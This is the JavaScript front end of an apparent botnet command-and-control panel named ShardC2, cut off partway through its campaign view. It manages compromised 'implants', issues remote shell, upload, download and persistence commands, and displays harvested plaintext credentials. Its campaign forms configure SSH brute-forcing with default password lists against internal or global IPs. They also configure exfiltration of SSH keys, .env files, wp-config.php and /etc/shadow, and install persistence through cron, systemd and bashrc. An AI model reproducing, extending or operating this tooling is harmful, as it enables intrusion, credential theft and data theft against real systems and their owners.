class API {
  constructor(token) {
    this.token = token;
    this.base = '/api/v1';
  }

  async request(method, path, body) {
    const opts = {
      method,
      headers: {
        'Authorization': `Bearer ${this.token}`,
        'Content-Type': 'application/json',
      },
    };
    if (body) opts.body = JSON.stringify(body);
    const resp = await fetch(this.base + path, opts);
    if (resp.status === 401 || resp.status === 403) {
      app.logout();
      throw new Error('Authentication failed');
    }
    return resp;
  }

  async get(path) { return (await this.request('GET', path)).json(); }
  async post(path, body) { return (await this.request('POST', path, body)).json(); }
  async put(path, body) { return (await this.request('PUT', path, body)).json(); }
  async del(path) { return (await this.request('DELETE', path)).json(); }
}

class App {
  constructor() {
    this.api = null;
    this.currentPage = 'dashboard';
    this.refreshTimer = null;
    this.bots = [];
    this.selectedBotId = null;
    this.cmdHistory = [];
    this.historyIndex = -1;
    this.terminalLines = [];
    this.activeCampaignId = null;
    this.campaignTab = 'overview';

    document.getElementById('token-input').addEventListener('keydown', (e) => {
      if (e.key === 'Enter') this.login();
    });

    document.querySelectorAll('.nav-link').forEach(link => {
      link.addEventListener('click', (e) => {
        e.preventDefault();
        this.navigate(link.dataset.page);
      });
    });

    const saved = sessionStorage.getItem('shardc2_token');
    if (saved) {
      this.api = new API(saved);
      this.showApp();
    }
  }

  async login() {
    const input = document.getElementById('token-input');
    const token = input.value.trim();
    if (!token) return;

    const errorEl = document.getElementById('login-error');
    const btn = document.getElementById('login-btn');
    btn.querySelector('.btn-inner').textContent = 'CONNECTING...';

    try {
      const testApi = new API(token);
      await testApi.get('/stats');
      this.api = testApi;
      sessionStorage.setItem('shardc2_token', token);
      errorEl.textContent = '';
      this.showApp();
    } catch (e) {
      errorEl.textContent = '[ ERROR ] Authentication failed. Invalid token.';
      btn.querySelector('.btn-inner').textContent = 'AUTHENTICATE';
    }
  }

  logout() {
    sessionStorage.removeItem('shardc2_token');
    this.api = null;
    clearInterval(this.refreshTimer);
    document.getElementById('app').classList.add('hidden');
    document.getElementById('login-screen').style.display = 'flex';
    document.getElementById('token-input').value = '';
    document.getElementById('login-btn').querySelector('.btn-inner').textContent = 'AUTHENTICATE';
  }

  showApp() {
    document.getElementById('login-screen').style.display = 'none';
    document.getElementById('app').classList.remove('hidden');
    this.navigate('dashboard');
  }

  navigate(page) {
    this.currentPage = page;
    clearInterval(this.refreshTimer);

    document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('active'));
    document.querySelector(`[data-page="${page}"]`)?.classList.add('active');

    const renders = {
      dashboard: () => this.renderDashboard(),
      bots: () => this.renderBots(),
      terminal: () => this.renderTerminal(),
      credentials: () => this.renderCredentials(),
      campaigns: () => this.renderCampaigns(),
    };

    if (renders[page]) renders[page]();
  }

  // ===== DASHBOARD =====
  async renderDashboard() {
    const c = document.getElementById('content');
    c.innerHTML = `
      <div class="page-header">
        <h1 class="page-title">OVERVIEW</h1>
        <span class="page-tag">REAL-TIME</span>
      </div>
      <div class="stats-grid" id="stats-grid"></div>
      <div class="section-header">
        <span class="section-title">ACTIVE IMPLANTS</span>
        <span class="refresh-hint">AUTO-REFRESH // 10s</span>
      </div>
      <div id="dash-bots"></div>`;
    await this.refreshDashboard();
    this.refreshTimer = setInterval(() => this.refreshDashboard(), 10000);
  }

  async refreshDashboard() {
    try {
      const [stats, botsData] = await Promise.all([
        this.api.get('/stats'),
        this.api.get('/bots/'),
      ]);
      this.bots = botsData.bots || [];

      document.getElementById('stats-grid').innerHTML = `
        <div class="stat-card"><div class="stat-label">Total Implants</div><div class="stat-value red">${stats.total_bots}</div></div>
        <div class="stat-card"><div class="stat-label">Active</div><div class="stat-value green">${stats.active_bots}</div></div>
        <div class="stat-card"><div class="stat-label">Pending Cmds</div><div class="stat-value yellow">${stats.pending_commands}</div></div>
        <div class="stat-card"><div class="stat-label">Campaigns</div><div class="stat-value crimson">${stats.active_campaigns}/${stats.total_campaigns}</div></div>`;

      const el = document.getElementById('dash-bots');
      if (this.bots.length === 0) {
        el.innerHTML = '<div class="empty-state"><div class="icon">&#9654;</div><p>NO IMPLANTS REGISTERED</p></div>';
        return;
      }

      el.innerHTML = `<div class="table-wrap"><table>
        <thead><tr><th>ID</th><th>Host</th><th>Internal IP</th><th>Platform</th><th>User</th><th>Status</th><th>Last Beacon</th></tr></thead>
        <tbody>${this.bots.map(b => `
          <tr class="clickable" onclick="app.openTerminalForBot('${b.id}')">
            <td style="color:var(--red)">${b.id.substring(0, 8)}</td>
            <td style="color:var(--text-bright)">${esc(b.hostname)}</td>
            <td>${esc(b.ip_address)}</td>
            <td><span class="os-tag">${osTag(b.os)}</span>${esc(b.architecture)}</td>
            <td>${esc(b.username)}${b.privileged ? ' <span class="priv-tag">ROOT</span>' : ''}</td>
            <td>${statusBadge(b)}</td>
            <td>${timeAgo(b.last_seen)}</td>
          </tr>`).join('')}</tbody></table></div>`;
    } catch (e) {
      console.error('Dashboard refresh failed:', e);
    }
  }

  // ===== BOTS =====
  async renderBots() {
    const c = document.getElementById('content');
    c.innerHTML = `
      <div class="page-header">
        <h1 class="page-title">IMPLANTS</h1>
        <span class="page-tag">ASSET MANAGEMENT</span>
      </div>
      <div id="bot-detail-panel"></div>
      <div class="section-header">
        <span class="section-title">REGISTERED IMPLANTS</span>
        <span class="refresh-hint">AUTO-REFRESH // 10s</span>
      </div>
      <div id="bots-table"></div>`;
    await this.refreshBots();
    this.refreshTimer = setInterval(() => this.refreshBots(), 10000);
  }

  async refreshBots() {
    const data = await this.api.get('/bots/');
    this.bots = data.bots || [];
    const el = document.getElementById('bots-table');

    if (this.bots.length === 0) {
      el.innerHTML = '<div class="empty-state"><div class="icon">&#9654;</div><p>NO IMPLANTS REGISTERED</p></div>';
      return;
    }

    el.innerHTML = `<div class="table-wrap"><table>
      <thead><tr><th>ID</th><th>Hostname</th><th>Internal</th><th>External</th><th>Platform</th><th>User</th><th>Priv</th><th>Status</th><th>Last Beacon</th><th>Actions</th></tr></thead>
      <tbody>${this.bots.map(b => `
        <tr>
          <td style="color:var(--red)">${b.id.substring(0, 8)}</td>
          <td style="color:var(--text-bright)">${esc(b.hostname)}</td>
          <td>${esc(b.ip_address)}</td>
          <td>${esc(b.external_ip)}</td>
          <td><span class="os-tag">${osTag(b.os)}</span>${esc(b.architecture)}</td>
          <td>${esc(b.username)}</td>
          <td>${b.privileged ? '<span class="priv-tag">ROOT</span>' : '<span style="color:var(--text-muted)">NO</span>'}</td>
          <td>${statusBadge(b)}</td>
          <td>${timeAgo(b.last_seen)}</td>
          <td>
            <button class="btn-sm" onclick="app.openTerminalForBot('${b.id}')">SHELL</button>
            <button class="btn-sm btn-danger" onclick="app.removeBot('${b.id}')">KILL</button>
          </td>
        </tr>`).join('')}</tbody></table></div>`;

    if (this.selectedBotId) this.showBotDetail(this.selectedBotId);
  }

  async showBotDetail(id) {
    this.selectedBotId = id;
    const b = this.bots.find(b => b.id === id);
    if (!b) return;

    document.getElementById('bot-detail-panel').innerHTML = `
      <div class="bot-detail">
        <div class="bot-detail-header">
          <h3>${esc(b.hostname)} // ${b.id.substring(0, 8)}</h3>
          <button class="btn-sm" onclick="document.getElementById('bot-detail-panel').innerHTML=''">CLOSE</button>
        </div>
        <div class="bot-detail-grid">
          <div><div class="bot-field-label">Implant ID</div><div class="bot-field-value" style="color:var(--red)">${b.id}</div></div>
          <div><div class="bot-field-label">Internal IP</div><div class="bot-field-value">${esc(b.ip_address)}</div></div>
          <div><div class="bot-field-label">External IP</div><div class="bot-field-value">${esc(b.external_ip)}</div></div>
          <div><div class="bot-field-label">Platform</div><div class="bot-field-value">${esc(b.os)} / ${esc(b.architecture)}</div></div>
          <div><div class="bot-field-label">User</div><div class="bot-field-value">${esc(b.username)}</div></div>
          <div><div class="bot-field-label">Privilege</div><div class="bot-field-value">${b.privileged ? '<span class="priv-tag">ROOT ACCESS</span>' : 'Standard'}</div></div>
          <div><div class="bot-field-label">Status</div><div class="bot-field-value">${statusBadge(b)}</div></div>
          <div><div class="bot-field-label">Beacon Interval</div><div class="bot-field-value">${b.beacon_interval}s</div></div>
          <div><div class="bot-field-label">First Contact</div><div class="bot-field-value">${new Date(b.created_at).toLocaleString()}</div></div>
        </div>
      </div>`;
  }

  async removeBot(id) {
    if (!confirm(`Terminate implant ${id.substring(0, 8)}?`)) return;
    await this.api.del(`/bots/${id}`);
    this.selectedBotId = null;
    this.refreshBots();
  }

  openTerminalForBot(id) {
    this.selectedBotId = id;
    this.navigate('terminal');
  }

  // ===== TERMINAL =====
  async renderTerminal() {
    const c = document.getElementById('content');

    if (this.bots.length === 0) {
      const data = await this.api.get('/bots/');
      this.bots = data.bots || [];
    }

    const opts = this.bots.map(b =>
      `<option value="${b.id}" ${b.id === this.selectedBotId ? 'selected' : ''}>${esc(b.hostname)} [${b.id.substring(0, 8)}] ${esc(b.ip_address)}</option>`
    ).join('');

    c.innerHTML = `
      <div class="terminal-container">
        <div class="terminal-header">
          <select id="term-bot-select" onchange="app.selectedBotId = this.value; app.loadHistory()">
            <option value="">-- SELECT TARGET --</option>
            ${opts}
          </select>
          <button class="btn-sm" onclick="app.loadHistory()">RELOAD</button>
          <button class="btn-sm" onclick="app.clearTerminal()">CLEAR</button>
        </div>
        <div class="terminal-output" id="term-output"><span class="cmd-system">[*] ShardC2 Remote Shell
[*] Select a target implant to begin.
[*] Command types: shell | download | upload | sleep | persist | kill</span></div>
        <div class="terminal-input-row">
          <span class="terminal-prompt">root@shard:~#</span>
          <input type="text" id="term-input" placeholder="enter command..." onkeydown="app.handleTerminalKey(event)" autocomplete="off" spellcheck="false">
          <select class="cmd-type-select" id="term-cmd-type">
            <option value="shell">SHELL</option>
            <option value="download">DOWNLOAD</option>
            <option value="upload">UPLOAD</option>
            <option value="sleep">SLEEP</option>
            <option value="persist">PERSIST</option>
            <option value="kill">KILL</option>
          </select>
        </div>
      </div>`;

    document.getElementById('term-input').focus();
    if (this.selectedBotId) this.loadHistory();
  }

  async loadHistory() {
    if (!this.selectedBotId) return;
    const output = document.getElementById('term-output');

    try {
      const data = await this.api.get(`/commands/history/${this.selectedBotId}`);
      const cmds = (data.commands || []).reverse();

      this.terminalLines = [];

      const bot = this.bots.find(b => b.id === this.selectedBotId);
      if (bot) {
        this.terminalLines.push(`<span class="cmd-system">[*] Connected to ${esc(bot.hostname)} (${esc(bot.ip_address)})
[*] Platform: ${esc(bot.os)}/${esc(bot.architecture)} | User: ${esc(bot.username)} | Priv: ${bot.privileged ? 'ROOT' : 'standard'}</span>`);
      }

      cmds.forEach(cmd => {
        this.terminalLines.push(`\n<span class="cmd-system">[${cmd.type.toUpperCase()}]</span> <span class="cmd-input">${esc(cmd.payload)}</span>`);
        if (cmd.output) {
          const cls = cmd.status === 'failed' ? 'cmd-error' : 'cmd-output';
          this.terminalLines.push(`<span class="${cls}">${esc(cmd.output)}</span>`);
        }
        if (cmd.status === 'pending' || cmd.status === 'executing') {
          this.terminalLines.push(`<span class="cmd-system">[${cmd.status.toUpperCase()}...]</span>`);
        }
      });

      output.innerHTML = this.terminalLines.join('\n') || '<span class="cmd-system">[*] No history. Start operating.</span>';
      output.scrollTop = output.scrollHeight;
    } catch (e) {
      output.innerHTML = `<span class="cmd-error">[!] Failed to load history: ${e.message}</span>`;
    }
  }

  async handleTerminalKey(e) {
    if (e.key === 'Enter') {
      const input = document.getElementById('term-input');
      const cmd = input.value.trim();
      if (!cmd || !this.selectedBotId) return;

      const cmdType = document.getElementById('term-cmd-type').value;
      const output = document.getElementById('term-output');

      this.cmdHistory.push(cmd);
      this.historyIndex = this.cmdHistory.length;

      this.terminalLines.push(`\n<span class="cmd-system">[${cmdType.toUpperCase()}]</span> <span class="cmd-input">${esc(cmd)}</span>`);
      this.terminalLines.push(`<span class="cmd-system">[PENDING...]</span>`);
      output.innerHTML = this.terminalLines.join('\n');
      output.scrollTop = output.scrollHeight;
      input.value = '';

      try {
        await this.api.post('/commands/', {
          bot_id: this.selectedBotId,
          type: cmdType,
          payload: cmd,
        });
        this.pollCount = 0;
        setTimeout(() => this.pollForResult(), 1000);
      } catch (e) {
        this.terminalLines.pop();
        this.terminalLines.push(`<span class="cmd-error">[!] Send failed: ${e.message}</span>`);
        output.innerHTML = this.terminalLines.join('\n');
      }
    } else if (e.key === 'ArrowUp') {
      e.preventDefault();
      if (this.historyIndex > 0) {
        this.historyIndex--;
        document.getElementById('term-input').value = this.cmdHistory[this.historyIndex];
      }
    } else if (e.key === 'ArrowDown') {
      e.preventDefault();
      if (this.historyIndex < this.cmdHistory.length - 1) {
        this.historyIndex++;
        document.getElementById('term-input').value = this.cmdHistory[this.historyIndex];
      } else {
        this.historyIndex = this.cmdHistory.length;
        document.getElementById('term-input').value = '';
      }
    }
  }

  async pollForResult() {
    if (!this.selectedBotId || this.currentPage !== 'terminal') return;

    const data = await this.api.get(`/commands/history/${this.selectedBotId}`);
    const cmds = (data.commands || []).reverse();
    const output = document.getElementById('term-output');

    const bot = this.bots.find(b => b.id === this.selectedBotId);
    this.terminalLines = [];

    if (bot) {
      this.terminalLines.push(`<span class="cmd-system">[*] Connected to ${esc(bot.hostname)} (${esc(bot.ip_address)})
[*] Platform: ${esc(bot.os)}/${esc(bot.architecture)} | User: ${esc(bot.username)} | Priv: ${bot.privileged ? 'ROOT' : 'standard'}</span>`);
    }

    cmds.forEach(cmd => {
      this.terminalLines.push(`\n<span class="cmd-system">[${cmd.type.toUpperCase()}]</span> <span class="cmd-input">${esc(cmd.payload)}</span>`);
      if (cmd.output) {
        const cls = cmd.status === 'failed' ? 'cmd-error' : 'cmd-output';
        this.terminalLines.push(`<span class="${cls}">${esc(cmd.output)}</span>`);
      }
      if (cmd.status === 'pending' || cmd.status === 'executing') {
        this.terminalLines.push(`<span class="cmd-system">[${cmd.status.toUpperCase()}...]</span>`);
      }
    });

    output.innerHTML = this.terminalLines.join('\n');
    output.scrollTop = output.scrollHeight;

    const lastCmd = cmds[cmds.length - 1];
    if (lastCmd && (lastCmd.status === 'pending' || lastCmd.status === 'executing')) {
      this.pollCount = (this.pollCount || 0) + 1;
      if (this.pollCount < 30) {
        setTimeout(() => this.pollForResult(), 2000);
      }
    }
  }

  clearTerminal() {
    this.terminalLines = [];
    const output = document.getElementById('term-output');
    output.innerHTML = '<span class="cmd-system">[*] Terminal cleared.\n[*] Ready for operations.</span>';
  }

  // ===== CREDENTIALS =====
  async renderCredentials() {
    const c = document.getElementById('content');
    c.innerHTML = `
      <div class="page-header">
        <h1 class="page-title">CREDENTIALS</h1>
        <span class="page-tag">HARVESTED</span>
      </div>
      <div class="actions-bar">
        <button class="btn-sm" onclick="app.refreshCredentials()">REFRESH</button>
      </div>
      <div id="creds-table"></div>`;
    await this.refreshCredentials();
  }

  async refreshCredentials() {
    const data = await this.api.get('/credentials/');
    const creds = data.credentials || [];
    const el = document.getElementById('creds-table');

    if (creds.length === 0) {
      el.innerHTML = '<div class="empty-state"><div class="icon">&#9670;</div><p>NO CREDENTIALS HARVESTED</p></div>';
      return;
    }

    el.innerHTML = `<div class="table-wrap"><table>
      <thead><tr><th>Target</th><th>Port</th><th>Service</th><th>Username</th><th>Password</th><th>Valid</th><th>Source</th><th>Discovered</th><th>Actions</th></tr></thead>
      <tbody>${creds.map(c => `
        <tr>
          <td style="color:var(--text-bright)">${esc(c.target)}</td>
          <td>${c.port}</td>
          <td><span class="os-tag">${esc(c.service).toUpperCase()}</span></td>
          <td style="color:var(--red-bright)">${esc(c.username)}</td>
          <td style="color:var(--yellow)">${esc(c.password)}</td>
          <td>${c.valid ? '<span class="badge badge-active">VALID</span>' : '<span class="badge badge-dead">INVALID</span>'}</td>
          <td>${c.bot_id ? c.bot_id.substring(0, 8) : '-'}</td>
          <td>${timeAgo(c.discovered_at)}</td>
          <td><button class="btn-sm btn-danger" onclick="app.deleteCredential('${c.id}')">DELETE</button></td>
        </tr>`).join('')}</tbody></table></div>`;
  }

  async deleteCredential(id) {
    await this.api.del(`/credentials/${id}`);
    this.refreshCredentials();
  }

  // ===== CAMPAIGNS =====
  async renderCampaigns() {
    const c = document.getElementById('content');

    if (this.bots.length === 0) {
      const data = await this.api.get('/bots/');
      this.bots = data.bots || [];
    }

    if (this.activeCampaignId) {
      await this.renderCampaignDetail(this.activeCampaignId);
      return;
    }

    c.innerHTML = `
      <div class="page-header">
        <h1 class="page-title">CAMPAIGNS</h1>
        <span class="page-tag">OPERATIONS</span>
      </div>
      <div class="camp-detail" id="camp-create-panel">
        <div style="margin-bottom:1rem;color:var(--text-muted);font-size:0.7rem;letter-spacing:0.1em">NEW OPERATION</div>
        <div class="config-grid">
          <div class="form-group">
            <label>Operation Name</label>
            <input type="text" id="camp-name" placeholder="e.g. Internal Recon Phase 1">
          </div>
          <div class="form-group">
            <label>Campaign Type</label>
            <select id="camp-type" onchange="app.updateCampaignConfigForm()">
              <option value="recon">RECON - System Enumeration</option>
              <option value="brute">BRUTE - Lateral Movement</option>
              <option value="exfil">EXFIL - Data Exfiltration</option>
              <option value="persist">PERSIST - Persistence Install</option>
              <option value="custom">CUSTOM - Arbitrary Command</option>
            </select>
          </div>
          <div class="form-group config-full">
            <label>Description</label>
            <input type="text" id="camp-desc" placeholder="Mission brief / objective">
          </div>
        </div>
        <div id="camp-config-form"></div>
        <div style="margin-top:0.8rem;margin-bottom:0.6rem;color:var(--text-muted);font-size:0.65rem;letter-spacing:0.1em">ASSIGN IMPLANTS</div>
        <div class="bot-picker" id="camp-bot-picker">
          ${this.bots.map(b => `
            <div class="bot-chip" data-botid="${b.id}" onclick="this.classList.toggle('selected')">
              <span>${esc(b.hostname)} [${b.id.substring(0, 8)}]</span>
              <span style="color:var(--text-muted);font-size:0.65rem">${esc(b.ip_address)}</span>
            </div>`).join('')}
        </div>
        ${this.bots.length > 1 ? '<button class="btn-sm" style="margin-top:0.3rem" onclick="document.querySelectorAll(\'.bot-chip\').forEach(c=>c.classList.add(\'selected\'))">SELECT ALL</button>' : ''}
        <div style="margin-top:1rem;display:flex;gap:0.5rem">
          <button class="btn-accent" onclick="app.createAndLaunchCampaign()">CREATE & LAUNCH</button>
          <button class="btn-sm" onclick="app.createCampaign(false)">CREATE ONLY</button>
        </div>
      </div>
      <div class="section-header">
        <span class="section-title">OPERATIONS</span>
        <span class="refresh-hint">AUTO-REFRESH // 5s</span>
      </div>
      <div id="camps-table"></div>`;
    this.updateCampaignConfigForm();
    await this.refreshCampaigns();
    this.refreshTimer = setInterval(() => this.refreshCampaigns(), 5000);
  }

  updateCampaignConfigForm() {
    const type = document.getElementById('camp-type')?.value;
    const el = document.getElementById('camp-config-form');
    if (!el) return;

    const configs = {
      recon: `
        <div style="color:var(--text-muted);font-size:0.65rem;letter-spacing:0.1em;margin-bottom:0.5rem">RECON MODULES</div>
        <div class="bot-picker">
          ${['sysinfo','network','users','software','cloud','containers','sensitive_files','internal_network'].map(m =>
            `<div class="bot-chip selected" data-module="${m}" onclick="this.classList.toggle('selected')">${m.replace('_',' ').toUpperCase()}</div>`
          ).join('')}
        </div>`,
      brute: `
        <div class="config-grid">
          <div class="form-group config-full">
            <label>Attack Mode</label>
            <div class="bot-picker">
              <div class="bot-chip selected" data-mode="lateral" onclick="document.querySelectorAll('[data-mode]').forEach(c=>c.classList.remove('selected'));this.classList.add('selected')">LATERAL — Via compromised bots (internal targets)</div>
              <div class="bot-chip" data-mode="external" onclick="document.querySelectorAll('[data-mode]').forEach(c=>c.classList.remove('selected'));this.classList.add('selected')">EXTERNAL — Server-side SSH (global IPs)</div>
            </div>
          </div>
          <div class="form-group">
            <label>Targets (CIDRs/IPs/hostnames, comma-separated)</label>
            <input type="text" id="brute-targets" placeholder="e.g. 10.0.0.0/24, 203.0.113.50, target.example.com">
          </div>
          <div class="form-group">
            <label>Ports (comma-separated)</label>
            <input type="text" id="brute-ports" placeholder="22" value="22">
          </div>
          <div class="form-group">
            <label>Usernames (comma-separated)</label>
            <input type="text" id="brute-users" placeholder="root, admin, ubuntu" value="root, admin, ubuntu, ec2-user">
          </div>
          <div class="form-group">
            <label>Passwords (comma-separated)</label>
            <input type="text" id="brute-passes" placeholder="password, admin123" value="password, admin, root, toor, 123456, P@ssw0rd">
          </div>
          <div class="form-group">
            <label>Workers (concurrent threads)</label>
            <input type="number" id="brute-workers" placeholder="10" value="10" min="1" max="100">
          </div>
          <div class="form-group config-full">
            <label><input type="checkbox" id="brute-dbcreds" checked> Include harvested credentials from database</label>
          </div>
        </div>`,
      exfil: `
        <div class="config-grid">
          <div class="form-group config-full">
            <label>File Patterns (comma-separated)</label>
            <input type="text" id="exfil-patterns" placeholder="*.pem, *.key, .env, id_rsa" value="id_rsa, id_ed25519, *.pem, *.key, .env, *.env, wp-config.php, credentials, shadow">
          </div>
          <div class="form-group">
            <label>Specific Paths (comma-separated)</label>
            <input type="text" id="exfil-paths" placeholder="/etc/shadow, /root/.ssh/id_rsa">
          </div>
          <div class="form-group">
            <label>Max File Size</label>
            <input type="text" id="exfil-maxsize" placeholder="1M" value="1M">
          </div>
        </div>`,
      persist: `
        <div style="color:var(--text-muted);font-size:0.65rem;letter-spacing:0.1em;margin-bottom:0.5rem">PERSISTENCE METHODS</div>
        <div class="bot-picker">
          ${['cron','systemd','bashrc','rc.local'].map(m =>
            `<div class="bot-chip selected" data-method="${m}" onclick="this.classList.toggle('selected')">${m.toUpperCase()}</div>`
          ).join('')}
        </div>`,
      custom: `
        <div class="config-grid">
          <div class="form-group config-full">
            <label>Command</label>
            <textarea id="custom-cmd" rows="3" placeholder="whoami && id && uname -a" style="min-height:80px"></textarea>
          </div>
          <div class="form-group">
            <label>Command Type</label>
            <select id="custom-type">
              <option value="shell">SHELL</option>
              <option value="download">DOWNLOAD</option>
              <option value="upload">UPLOAD</option>
              <option value="persist">PERSIST</option>
            </select>
          </div>
        </div>`,
    };

    el.innerHTML = configs[type] || '';
  }

  buildCampaignConfig() {
    const type = document.getElementById('camp-type').value;

    switch (type) {
      case 'recon': {
        const modules = [...document.querySelectorAll('#camp-config-form .bot-chip.selected')]
          .map(el => el.dataset.module).filter(Boolean);
        return JSON.stringify({ modules });
      }
      case 'brute': {
        const modeEl = document.querySelector('[data-mode].selected');
        const mode = modeEl ? modeEl.dataset.mode : 'lateral';
        const targets = (document.getElementById('brute-targets')?.value || '').split(',').map(s => s.trim()).filter(Boolean);
        const ports = (document.getElementById('brute-ports')?.value || '22').split(',').map(s => parseInt(s.trim())).filter(Boolean);
        const usernames = (document.getElementById('brute-users')?.value || '').split(',').map(s => s.trim()).filter(Boolean);
        const passwords = (document.getElementById('brute-passes')?.value || '').split(',').map(s => s.trim()).filter(Boolean);
        const use_db_creds = document.getElementById('brute-dbcreds')?.checked || false;
        const workers = parseInt(document.getElementById('brute-workers')?.value) || 10;
        return JSON.stringify({ mode, targets, ports, usernames, passwords, use_db_creds, workers });
      }
      case 'exfil': {
        const patterns = (document.getElementById('exfil-patterns')?.value || '').split(',').map(s => s.trim()).filter(Boolean);
        const paths = (document.getElementById('exfil-paths')?.value || '').split(',').map(s => s.trim()).filter(Boolean);
        const max_file_size = document.getElementById('exfil-maxsize')?.value || '1M';
        return JSON.stringify({ patterns, paths, max_file_size });
      }
      case 'persist': {
        const methods = [...document.querySelectorAll('#camp-config-form .bot-chip.selected')]
          .map(el => el.dataset.method).filter(Boolean);
        return JSON.stringify({ methods });
      }
      case 'custom': {
        const command = document.getElementById('custom-cmd')?.value || '';
        const cmdType = document.getElementById('custom-type')?.value || 'shell';
        return JSON.stringify({ command, type: cmdType });
      }
    }
    return '{}';
  }

  getSelectedBotIds() {
    return [...document.querySelectorAll('#camp-bot-picker .bot-chip.selected')]
      .map(el => el.dataset.botid).filter(Boolean);
  }

  async createCampaign(andLaunch = false) {
    const name = document.getElementById('camp-name').value.trim();
    const type = document.getElementById('camp-type').value;
    const desc = document.getElementById('camp-desc').value.trim();
    const config = this.buildCampaignConfig();
    const botIds = this.getSelectedBotIds();

    if (!name) { alert('Operation name required'); return; }
    if (botIds.length === 0) { alert('Select at least one implant'); return; }

    const result = await this.api.post('/campaigns/', { name, type, description: desc, config });
    if (!result.id) { alert('Failed to create campaign'); return; }

    await this.api.post(`/campaigns/${result.id}/bots`, { bot_ids: botIds });

    if (andLaunch) {
      await this.api.post(`/campaigns/${result.id}/launch`);
    }

    document.getElementById('camp-name').value = '';
    document.getElementById('camp-desc').value = '';
    this.refreshCampaigns();
  }

  async createAndLaunchCampaign() {
    await this.createCampaign(true);
  }

  async refreshCampaigns() {
    const data = await this.api.get('/campaigns/');
    const camps = data.campaigns || [];
    const el = document.getElementById('camps-table');
    if (!el) return;

    if (camps.length === 0) {
      el.innerHTML = '<div class="empty-state"><div class="icon">&#9733;</div><p>NO OPERATIONS</p></div>';
      return;
    }

    el.innerHTML = `<div class="table-wrap"><table>
      <thead><tr><th>Operation</th><th>Type</th><th>Status</th><th>Bots</th><th>Progress</th><th>Created</th><th>Actions</th></tr></thead>
      <tbody>${camps.map(c => {
        const pct = c.total_tasks > 0 ? Math.round((c.completed_tasks + c.failed_tasks) / c.total_tasks * 100) : 0;
        const progressHtml = c.total_tasks > 0
          ? `<div style="display:flex;align-items:center;gap:0.5rem">
              <div style="flex:1;background:var(--bg-input);height:8px;border:1px solid var(--border);min-width:80px">
                <div style="height:100%;width:${pct}%;background:${c.failed_tasks > c.completed_tasks ? 'var(--red)' : 'var(--green)'};transition:width 0.3s"></div>
              </div>
              <span style="font-size:0.65rem;color:var(--text-secondary)">${c.completed_tasks}/${c.total_tasks}</span>
            </div>`
          : '<span style="color:var(--text-muted);font-size:0.7rem">-</span>';
        return `
        <tr class="clickable" onclick="app.openCampaign('${c.id}')">
          <td style="color:var(--red-bright);font-weight:600">${esc(c.name)}</td>
          <td><span class="os-tag">${esc(c.type).toUpperCase()}</span></td>
          <td>${campStatusBadge(c.status)}</td>
          <td style="text-align:center">${c.bot_count || 0}</td>
          <td>${progressHtml}</td>
          <td>${timeAgo(c.created_at)}</td>
          <td>
            ${c.status === 'created' ? `<button class="btn-accent" style="padding:0.25rem 0.6rem;font-size:0.65rem" onclick="event.stopPropagation();app.launchCampaign('${c.id}')">LAUNCH</button>` : ''}
            ${c.status === 'running' ? `<button class="btn-sm" onclick="event.stopPropagation();app.pauseCampaign('${c.id}')">PAUSE</button>` : ''}
            ${c.status === 'paused' ? `<button class="btn-sm" onclick="event.stopPropagation();app.resumeCampaign('${c.id}')">RESUME</button>` : ''}
            <button class="btn-sm btn-danger" onclick="event.stopPropagation();app.deleteCampaign('${c.id}')">DELETE</button>
          </td>
        </tr>`;
      }).join('')}</tbody></table></div>`;
  }

  async openCampaign(id) {
    this.activeCampaignId = id;
    clearInterval(this.refreshTimer);
    await this.renderCampaignDetail(id);
  }

  async renderCampaignDetail(id) {
    const c = document.getElementById('content');

    try {
      const [camp, botsData, progress, results] = await Promise.all([
        this.api.get(`/campaigns/${id}`),
        this.api.get(`/campaigns/${id}/bots`),
        this.api.get(`/campaigns/${id}/progress`),
        this.api.get(`/campaigns/${id}/results`),
      ]);

      const pct = progress.total > 0 ? Math.round(progress.percent) : 0;
      const isComplete = progress.status === 'completed' || progress.status === 'failed';
      const tasks = results.tasks || [];
      const campBots = botsData.bots || [];

      c.innerHTML = `
        <div class="page-header">
          <h1 class="page-title">${esc(camp.name)}</h1>
          <span class="page-tag">${esc(camp.type).toUpperCase()}</span>
          <div style="margin-left:auto;display:flex;gap:0.5rem">
            ${camp.status === 'created' ? `<button class="btn-accent" onclick="app.launchCampaign('${id}')">LAUNCH</button>` : ''}
            ${camp.status === 'running' ? `<button class="btn-sm" onclick="app.pauseCampaign('${id}')">PAUSE</button>` : ''}
            ${camp.status === 'paused' ? `<button class="btn-accent" onclick="app.resumeCampaign('${id}')">RESUME</button>` : ''}
            <button class="btn-sm" onclick="app.activeCampaignId=null;app.navigate('campaigns')">BACK</button>
          </div>
        </div>

        <div class="camp-detail">
          <div class="camp-meta">
            <div class="camp-meta-item">
              <span class="camp-meta-label">Status</span>
              <span class="camp-meta-value">${campStatusBadge(camp.status)}</span>
            </div>
            <div class="camp-meta-item">
              <span class="camp-meta-label">Type</span>
              <span class="camp-meta-value" style="text-transform:uppercase">${esc(camp.type)}</span>
            </div>
            <div class="camp-meta-item">
              <span class="camp-meta-label">Implants</span>
              <span class="camp-meta-value">${campBots.length}</span>
            </div>
            <div class="camp-meta-item">
              <span class="camp-meta-label">Created</span>
              <span class="camp-meta-value">${new Date(camp.created_at).toLocaleString()}</span>
            </div>
            ${camp.description ? `<div class="camp-meta-item"><span class="camp-meta-label">Brief</span><span class="camp-meta-value">${esc(camp.description)}</span></div>` : ''}
          </div>

          ${progress.total > 0 ? `
            <div class="progress-wrap">
              <div class="progress-bar ${isComplete ? 'complete' : ''}" style="width:${pct}%"></div>
              <div class="progress-text">${pct}% - ${progress.completed + progress.failed}/${progress.total} TASKS</div>
            </div>
            <div class="progress-stats">
              <span><span class="dot-green">&#9632;</span> Completed: ${progress.completed}</span>
              <span><span class="dot-red">&#9632;</span> Failed: ${progress.failed}</span>
              <span><span class="dot-yellow">&#9632;</span> Pending: ${progress.pending}</span>
            </div>
          ` : '<div style="color:var(--text-muted);font-size:0.75rem;margin-top:0.5rem">No tasks generated yet. Launch the campaign to begin.</div>'}
        </div>

        ${camp.status === 'created' ? `
          <div class="camp-detail" style="border-top-color:var(--yellow)">
            <div style="margin-bottom:0.6rem;color:var(--text-muted);font-size:0.65rem;letter-spacing:0.1em">ASSIGN IMPLANTS</div>
            <div class="bot-picker" id="detail-bot-picker">
              ${this.bots.map(b => {
                const assigned = campBots.some(cb => cb.id === b.id);
                return `<div class="bot-chip ${assigned ? 'selected' : ''}" data-botid="${b.id}" onclick="app.toggleCampaignBot('${id}','${b.id}',this)">
